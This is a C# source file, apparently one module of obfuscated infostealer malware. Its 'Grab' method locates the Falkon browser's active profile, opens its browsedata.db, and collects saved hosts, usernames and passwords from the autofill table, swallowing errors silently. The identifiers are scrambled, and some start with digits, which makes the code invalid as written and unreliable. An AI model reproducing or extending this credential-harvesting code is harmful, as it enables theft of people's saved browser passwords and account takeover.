using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using C6Zy;
using rCOGWW;

namespace rk937aHHc
{
	public class Falkon_Browser : EtbH
	{
		public Falkon_Browser()
		{
			this.7CQGSikEfb = "Falkon Browser";
		}

		public string 7CQGSikEfb { get; set; }

    public List<WTitxI2m> Grab()
    {
        List<WTitxI2m> list = new List<WTitxI2m>();

        string profilesPath =
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
            + "\\falkon\\profiles\\";

        if (!Directory.Exists(profilesPath))
            return list;

        string profilesIni = Path.Combine(profilesPath, "profiles.ini");
        if (!File.Exists(profilesIni))
            return list;

        string iniContent = File.ReadAllText(profilesIni);
        string profileName = new Regex("startProfile=([A-z0-9\\/\\.\\\"]+)")
            .Match(iniContent)
            .Groups[1]
            .Value
            .Trim('"');

        string databasePath = Path.Combine(
            profilesPath,
            profileName,
            "browsedata.db"
        );

        btrVogW database;
        try
        {
            database = new btrVogW(databasePath);
        }
        catch
        {
            return list;
        }

        if (!database.f9NLCu("autofill"))
            return list;

        for (int i = 0; i < database.unm(); i++)
        {
            try
            {
                string host = database.68OQjJrpl(i, 1);
                string username = database.68OQjJrpl(i, 4);
                string password = database.68OQjJrpl(i, 3);

                if (!string.IsNullOrEmpty(host) &&
                    !string.IsNullOrEmpty(username) &&
                    !string.IsNullOrEmpty(password))
                {
                    list.Add(new WTitxI2m
                    {
                        data1 = host,
                        data2 = username,
                        data3 = password,
                        data4 = this.7CQGSikEfb
                    });
                }
            }
            catch
            {
            }
        }

        return list;
    }
}
